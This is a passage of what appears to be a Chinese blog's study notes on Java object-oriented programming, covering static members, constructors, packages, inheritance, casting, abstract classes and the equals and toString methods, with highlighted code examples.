punctuation">)</span><span class="token punctuation">;</span></code></pre><p>staff[0]对象的<code>getOtherName</code>方法还可以访问other对象的私有字段name，是因为他们都是<code>Employee</code>类型对象，<code>Employee</code>类的方法可以访问任意<code>Employee</code>类型对象的私有字段。</p><p>可以将实例字段定义为final。这样的字段必须在构造对象时初始化，并且以后不能再修改这个字段。</p><p>如果类中的所有方法都不会改变其对象，这样的类就是不可变的类。</p><p><strong>静态字段</strong></p><p>如果将一个字段定义为static，每个类只有一个这样的字段。而对于非静态的实例字段，每个对象都有自己的一个副本。</p><p>静态字段属于类，而不属于任何单个的对象。</p><p><strong>静态常量</strong></p><p>静态常量很常用，例如：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Employee</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">double</span> <span class="token constant">PI</span> <span class="token operator">=</span> <span class="token number">3.141592653</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>然后就可以用<code>Employee.PI</code>来访问这个静态常量。</p><p><strong>静态方法</strong></p><p>静态方法是不在对象上执行的方法。例如Math类的pow方法。</p><p>可以认为静态方法是没有<code>this</code>参数的方法（没有隐式参数）</p><p>静态方法不能访问实例字段，但是可以访问静态字段。</p><p>建议使用类名而不是对象来调用静态方法。</p><p>下面两种情况下可以使用静态方法：</p><ul><li>方法不需要访问对象状态，因为它需要的所有参数都通过显式参数提供。</li><li>方法只需要访问类的静态字段。</li></ul><p><strong>Java程序设计语言总是采用按值调用。也就是说，方法得到的是所有参数值的一个副本。</strong>具体来讲，方法不能修改传递给它的任何参数变量的内容。</p><p>方法得到的是对象引用的副本，原来的对象引用和这个副本都引用同一个对象。</p><p>实际上，对象引用是按值传递的。</p><ul><li>方法不能修改基本数据类型的参数。</li><li>方法可以改变对象参数的状态。</li><li>方法不能让一个对象参数引用一个新的对象。</li></ul><p><strong>重载</strong></p><p>如果多个方法有相同的名字、不同的参数，便出现了重载。编译器必须挑选出具体调用哪个方法。</p><blockquote><p>Java允许重载任何方法，而不只是构造器方法。因此，要完整地描述一个方法，需要指定方法名以及参数类型。这叫做方法的签名。</p><p><strong>返回类型不是方法签名的一部分。也就是说，不能有两个名字相同、类型参数也相同却有不同返回类型的方法。</strong></p></blockquote><p>如果在构造器中没有显式地为字段设置值，那么就会被自动地赋为默认值：数值为0、布尔值为false、对象引用为null。</p><blockquote><p>方法中的局部变量必须明确地初始化，但是在类中，如果没有初始化类中的字段，将会自动初始化为默认值。</p></blockquote><p>无参构造器创建对象时，对象的状态会设置为适当的默认值。如果写一个类时没有编写构造器，就会为你提供一个无参数构造器。这个构造器将所有的实例字段设置为默认值。</p><p>如果类中提供了至少一个构造器，但是没有提供无参数的构造器，那么构造对象时如果不提供参数就是不合法的。</p><p>可以在类定义中直接为任何字段赋值：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Employee</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token operator">=</span><span class="token string">"feng"</span><span class="token punctuation">;</span></code></pre><p>初始值不一定是常量值，可以利用方法调用初始化一个字段：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">int</span> nextId <span class="token punctuation">;</span><span class="token keyword">private</span> <span class="token keyword">int</span> id<span class="token operator">=</span> <span class="token function">assignId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">assignId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> r <span class="token operator">=</span> nextId<span class="token punctuation">;</span>    nextId<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> r<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><strong>调用另一个构造器</strong></p><p>关键字<code>this</code>指示一个方法的隐式参数。此外，如果构造器的<strong>第一个语句</strong>形如<code>this(...)</code>，这个构造器将调用同一个类的另一个构造器。</p><p><strong>初始化块(不常见)</strong></p><p>在一个类的声明中，可以包含任意多个代码块。只要构造这个类的对象，这些块就会被执行。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token punctuation">&#123;</span>    id <span class="token operator">=</span> nextId<span class="token punctuation">;</span>    nextId <span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token keyword">double</span> salary<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>salary <span class="token operator">=</span> salary<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><strong>首先</strong>运行初始化块，然后才运行构造器的主体部分。通常直接把初始化代码放在构造器中。</p><p>如果类的静态字段需要很复杂的初始化代码，那么可以使用静态的初始化块：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">static</span><span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> generator <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    nextId <span class="token operator">-</span> generator<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><strong>由于Java会完成自动的垃圾回收，不需要人工回收内存，所以Java不支持析构器。</strong></p><p><strong>包</strong></p><blockquote><p>Java允许使用包将类组织在一个集合中。借助包可以方便地组织自己的代码，并将自己的代码与别人提供的代码库分开管理。</p></blockquote><p>使用包的主要原因是确保类名的唯一性。为了保证包名的绝对唯一性，要用一个因特网域名以逆序的形式作为包名，然后对于不同的工程使用不同的子包。</p><p><strong>一个类可以使用所属包中的所有类，以及其他包中的公共类</strong></p><p>可以使用import语句导入一个特定的类或者整个包。import语句应该位于源文件的顶部（但位于package语句的后面）。</p><p>例如导入<code>java.util</code>包中的所有类：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>time<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span></code></pre><p>只能使用星号导入一个包，而不能使用<code>import java.*</code>或者<code>import java.*.*</code>导入所有以java为前缀的包。</p><p>有一种import 语句允许导入静态方法和静态字段，而不只是类。例如：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token keyword">static</span> <span class="token import static"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token operator">*</span></span><span class="token punctuation">;</span></code></pre><p>就可以使用<code>System</code>类的静态方法和静态字段，而不必加类前缀。</p><p>要想将类放入包中，就必须将包的名字放在源文件的开头，即放在定义这个包中各个类的代码之前。</p><p>如果没有在源文件中放置package语句，这个源文件中的类就属于无名包。</p><p>将源文件放在与完整包名匹配的子目录中。</p><p>Java和Php不同的是，Java其实算有4种访问修饰符。如果没有指定public或private，这个部分（类、方法或变量）可以被同一个包中的所有方法访问。</p><blockquote><p>类的成员不写访问修饰时默认为default。默认对于同一个包中的其他类相当于公开（public），对于不是同一个包中的其他类相当于私有（private）</p></blockquote><p><img src="class.png" loading="lazy"></p><blockquote><p>Jar文件使用ZIP格式组织文件和子目录。可以使用任何ZIP工具查看JAR文件。</p></blockquote><p>为了使类能够被多个程序共享，需要做到下面几点：</p><ol><li>把类文件放在一个目录中。需要注意，这目录是包树状结构的基目录。</li><li>将JAR文件放在一个目录中。</li><li>设置类路径。类路径是所有包含类文件的路径的集合。</li></ol><p>最好使用-classpath选项指定类路径。</p><p><strong>JAR文件</strong></p><p>JAR文件是压缩的，它使用了我们熟悉的ZIP压缩格式。</p><p>通过下面的命令启动程序：</p><pre class="language-java" data-language="java"><code class="language-java">java <span class="token operator">-</span>jar xxxxxx<span class="token punctuation">.</span>jar</code></pre><p><strong>类设计技巧</strong></p><ol><li>一定要保证数据私有。</li><li>一定要对数据进行初始化。</li><li>不要在类中使用过多的基本类型。</li><li>不是所有的字段都需要单独的字段访问器和字段更改器。</li><li>分解有过多职责的类。</li><li>类名和方法名要能够体现它们的职责。</li><li>优先使用不可变的类。</li></ol><h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><p><strong>继承</strong>的基本思想是，可以基于已有的类创建新的类。继承已存在的类就是复用（继承）这些类的方法，而且可以增加一些新的方法和字段，使新类能够适应新的情况。</p><h4 id="类、超类和子类"><a href="#类、超类和子类" class="headerlink" title="类、超类和子类"></a>类、超类和子类</h4><p>使用extends表示继承。</p><p>通过拓展超类定义子类的时候，只需要指出子类与超类的不同之处。</p><p>只有父类的方法能访问父类的私有字段，这意味如果子类的方法不能直接访问父类的私有字段，需要使用公共接口，类似<code>getSalary()</code>这样的：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">double</span> <span class="token function">getSalary</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>bonus<span class="token operator">+</span><span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">getSalary</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>这里使用的是<code>super.getSalary()</code>，因为我们希望调用的是超类的<code>getSalary</code>方法，而不是当前类的这个方法。</p><p>继承绝对不会删除任何字段或方法。</p><p>子类的构造器：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">Manager</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token keyword">double</span> salary<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">super</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span>salary<span class="token punctuation">)</span><span class="token punctuation">;</span>    bonus <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><code>super(name,salary);</code>是调用超类<code>Employee</code>中的这个构造器：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token keyword">double</span> salary<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>salary <span class="token operator">=</span> salary<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><strong>使用super调用构造器的语句必须是子类构造器的第一条语句。</strong></p><p>如果子类的构造器没有显式地调用超类的构造器，讲自动调用超类的无参数构造器。如果超类没有无参数的构造器，并且在子类的构造器中又没有显式地调用超类的其他构造器，Java编译器就会报告一个错误。</p><p>this：</p><ul><li>指示隐式参数的引用。</li><li>调用该类的其他构造器。</li></ul><p>super：</p><ul><li>调用超类的方法。</li><li>调用超类的构造器。</li></ul><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var0<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> staff <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token class-name">Manager</span> boss <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Manager</span><span class="token punctuation">(</span><span class="token string">"feng1"</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    boss<span class="token punctuation">.</span><span class="token function">setBonus</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    staff<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> boss<span class="token punctuation">;</span>    staff<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token string">"feng2"</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    staff<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token string">"feng3"</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Employee</span> e<span class="token operator">:</span>staff<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">getSalary</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>尽管将e声明为Employee类型，但实际上e既可以引用Employee类型的对象，也可以引用Manager类型的对象。</p><p>虚拟机知道e实际引用的对象类型，因此能够正确地调用相应的方法。</p><p>一个对象变量可以指示多种实际类型的现象称为<strong>多态</strong>。在运行时能够自动地选择适当的方法，称为<strong>动态绑定</strong>。</p><h4 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h4><p>is-a规则，它指出子类的每个对象也是超类的对象。</p><p><strong>is-a规则的另一种表述是替换原则。它指出程序中出现超类对象的任何地方都可以使用子类对象替换。</strong></p><p>在Java程序设计语言中，对象变量是多态的。一个Employee类型的变量既可以引用一个Employee类型的对象，也可以引用Employee类的任何一个子类的对象。</p><p>不能将超类的引用赋给子类变量。</p><blockquote><p>在Java中，子类引用的数组可以转换成超类引用的数组，而不需要使用强制类型转换。</p></blockquote><p>在覆盖一个方法的时候，子类方法不能低于超类方法的可见性。特别是，如果超类方法是public，子类方法必须也要声明为public。</p><h4 id="阻止继承：final类和方法"><a href="#阻止继承：final类和方法" class="headerlink" title="阻止继承：final类和方法"></a>阻止继承：final类和方法</h4><p>不允许拓展的类被称为final类。在定义类的时候使用final修饰符就表明这个类是final类。</p><p>类中的某个特定方法也可以被声明为final。如果这样做，子类就不能覆盖这个方法（final类中的所有方法自动地成为final方法，但是不包括字段，也就是说字段不会自动成为final）。</p><h4 id="强制类型转换"><a href="#强制类型转换" class="headerlink" title="强制类型转换"></a>强制类型转换</h4><p><strong>将一个值存入变量时，编译器将检查你是否承诺过多。如果将一个子类的引用赋值给一个超类变量，编译器是允许的。但将一个超类的引用赋给一个子类变量时，就承诺过多了。必须进行强制类型转换，这样才能够通过运行时的检查。</strong></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Manager</span> test1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Manager</span><span class="token punctuation">(</span><span class="token string">"test1"</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Employee</span> test2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token string">"test2"</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Employee</span> test3 <span class="token operator">=</span> test1<span class="token punctuation">;</span>  <span class="token comment">//可以</span><span class="token class-name">Manager</span> test4 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Manager</span><span class="token punctuation">)</span> test2<span class="token punctuation">;</span>  <span class="token comment">//必须强制类型转换。而且这样是有问题的。</span></code></pre><blockquote><p>我个人的理解就是，子类可以直接隐式转换成父类，但是父类需要强制类型转换成子类。</p></blockquote><p>在进行强制类型转换之前，先查看是否能够成功地转换。为此只需要使用instanceof操作符就可以实现。</p><p><code>instanceof</code>是Java中的二元运算符，左边是对象，右边是类；当对象是右边类或子类所创建对象时，返回true；否则，返回false。</p><ul><li><code>instanceof</code>是Java中的二元运算符，左边是对象，右边是类；当对象是右边类或子类所创建对象时，返回true；否则，返回false。</li><li><code>instanceof</code>左边显式声明的类型与右边操作元必须是同种类或存在继承关系，也就是说需要位于同一个继承树，否则会编译错误。</li></ul><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Manager</span> test1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Manager</span><span class="token punctuation">(</span><span class="token string">"test1"</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Employee</span> test2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token string">"test2"</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Employee</span> test3 <span class="token operator">=</span> test1<span class="token punctuation">;</span><span class="token comment">//Manager test4 = (Manager) test2;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>test2 <span class="token keyword">instanceof</span> <span class="token class-name">Manager</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">Manager</span> test4 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Manager</span><span class="token punctuation">)</span> test2<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>所以很明显这是进入不了<code>if</code>的。</p><ul><li>只能在继承层次内进行强制类型转换。</li><li>在将超类强制转换成子类之前，应该使用<code>instanceof</code>进行检查</li></ul><p><strong>一般情况下，最好尽量少用强制类型转换和<code>instanceof</code>运算符</strong></p><h4 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h4><p>为了提高程序的清晰度，包含一个或多个抽象方法的类本身必须被声明为<strong>抽象</strong>的。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token class-name">String</span> <span class="token function">getDescription</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>除了抽象方法之外，抽象类还可以包含字段和具体方法。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Person</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token class-name">String</span> <span class="token function">getDescription</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><blockquote><p>有些程序员认为，在抽象类中不能包含具体方法，。建议尽量将通用的字段和方法（不管是否是抽象的）放在超类（不管是否是抽象类）中。</p></blockquote><p>拓展抽象类可以有两种选择，一种是在子类中保留抽象类的部分或所有抽象方法仍未定义，这样就必须将子类也标记为抽象类；另一种做法是定义全部方法，这样一来，子类就不是抽象的了。</p><p>即使不含抽象方法，也可以将类声明为抽象类。</p><p><strong>抽象类不能实例化。</strong>但是可以定义一个抽象类的成员变量，但是这样一个变量只能引用非抽象子类的对象。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Person</span> person <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token string">"feng"</span><span class="token punctuation">,</span><span class="token string">"aaa"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="受保护访问"><a href="#受保护访问" class="headerlink" title="受保护访问"></a>受保护访问</h3><p>在Java中，保护字段只能由同一个包中的类访问。</p><ol><li>仅对本类可见：private</li><li>对外部完全可见：public</li><li>对本包和所有子类可见：protected</li><li>对本包可见：默认（很遗憾），不需要修饰符</li></ol><h4 id="Object：所有类的超类"><a href="#Object：所有类的超类" class="headerlink" title="Object：所有类的超类"></a>Object：所有类的超类</h4><p>可以使用<code>Object</code>类型的变量引用任何类型的对象：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Object</span> obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Manager</span><span class="token punctuation">(</span><span class="token string">"feng"</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><code>Object</code>类型的变量只能用于作为各种值得一个泛型容器。要想对其中得内容进行具体的操作，还需要清楚对象的原始类型，并进行相应的强制类型转换；</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Object</span> obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Manager</span><span class="token punctuation">(</span><span class="token string">"feng"</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Manager</span> feng <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Manager</span><span class="token punctuation">)</span> obj<span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>feng<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>在Java中，只有基本类型不是对象，例如数值、字符、布尔类型等都不是对象。</p><h4 id="equals方法"><a href="#equals方法" class="headerlink" title="equals方法"></a>equals方法</h4><p><code>Object</code>类中的<code>equals</code>方法用于检测一个对象是否等于另外一个对象。</p><p>例如Employee类实现一个<code>equals</code>方法：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">equals</span><span class="token punctuation">(</span><span class="token class-name">Object</span> otherObject<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">this</span> <span class="token operator">==</span> otherObject<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>otherObject <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> otherObject<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token class-name">Employee</span> other <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Employee</span><span class="token punctuation">)</span> otherObject<span class="token punctuation">;</span>    <span class="token class-name">String</span> name <span class="token operator">=</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token class-name">Objects</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>other<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token operator">&amp;&amp;</span>salary <span class="token operator">==</span> other<span class="token punctuation">.</span><span class="token function">getSalary</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token operator">&amp;&amp;</span><span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span>other<span class="token punctuation">.</span><span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><code>getClass</code>方法将返回一个对象所属的类。</p><blockquote><p>Returns the runtime class of this <code>Object</code>. The returned <code>Class</code> object is the object that is locked by <code>static synchronized</code> methods of the represented class.</p></blockquote><p>为了防备name可能为null的情况，需要使用<code>Objects.equals</code>方法。如果两个参数都为null，则<code>Objects.equals(a,b)</code>调用将返回true。如果其中一个参数为null，则返回false；否则，如果两个参数都不为null，则调用<code>a.equals(b)</code>。</p><p>完美的<code>equals</code>方法的建议：</p><ol><li>显式参数命名为otherObject，稍后需要将它强制转换为另一个名为other的变量。</li><li>检测this与<code>otherObject</code>是否相等：<br><code>if(this == otherObject) return true;</code></li><li>检测<code>otherObject</code>是否为null，如果为null，返回false。这项检测是很必要的。<br><code>if(otherObject == null) return false;</code></li><li>比较this与<code>otherObject</code>的类。如果<code>equals</code>的语义可以在子类中改变，那就使用<code>getClass</code>检测：<br><code>if(getClass() != otherObject.getClass()) return false;</code><br>如果所有的子类都有相同的相等性语义，可以使用<code>instanceof</code>检测：<br><code>if(!(otherObject instanceof ClassName)) return false;</code></li><li>将<code>otherObject</code>强制转换为相应类类型的变量：<br><code>ClassName other = (ClassName) otherObject;</code></li><li>根据相等性概念的要求来比较字段。使用<code>==</code>比较基本类型字段，使用<code>Objects.equals</code>比较对象字段。如果所有的字段都匹配，就返回true；否则返回false。<br>如果在子类中重新定义<code>equals</code>，就要在其中包含一个<code>super.equals(other)</code>的调用。</li></ol><blockquote><p>对于数组类型的字段，可以使用静态的<code>Arrays.equals</code>方法检测相应的数组元素是否相等。</p></blockquote><p>可以使用<code>@Override</code>标记要覆盖超类方法的那些子类方法：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">equals</span><span class="token punctuation">(</span><span class="token class-name">Object</span> otherObject<span class="token punctuation">)</span></code></pre><p>如果出现了错误，并且正在定义一个新方法，编译器就会报告一个错误。</p><p>例如这样，并没有覆盖<code>Object</code>类的<code>equals</code>方法，因此会报告错误：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">equals</span><span class="token punctuation">(</span><span class="token class-name">Employee</span> otherObject<span class="token punctuation">)</span></code></pre><h4 id="toString方法"><a href="#toString方法" class="headerlink" title="toString方法"></a><code>toString</code>方法</h4><p>返回表示对象值的一个字符串。</p><p>只要对象与一个字符串通过操作符 “+”连接起来，Java编译器就会自动地调用<code>toString</code>方法来获得这个对象的字符串描述。</p><blockquote><p>可以不写为<code>x.toString()</code>，而写作<code>&quot;&quot;+x</code>。与<code>toString</code>不同的是，即使x是基本类型，这条语句照样能够执行。</p></blockquote><p>打印数组利用<code>Arrays.toString</code>：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">double</span><span class="token punctuation">[</span><span class="token punctuation">]</span> x <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="泛型数组列表"><a href="#泛型数组列表" class="headerlink" title="泛型数组列表"></a>泛型数组列表</h3><p><code>ArrayList</code>是一个有类型参数的泛型类。为了指定数组列表保存的元素对象的类型，需要用一对尖括号将类名括起来追加到<code>ArrayList</code>后面，例如<code>ArrayList&lt;Integer&gt;</code>。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Employee</span><span class="token punctuation">></span></span> staff1 <span class="token operator">=</span> <span class="token keyword">new</span> 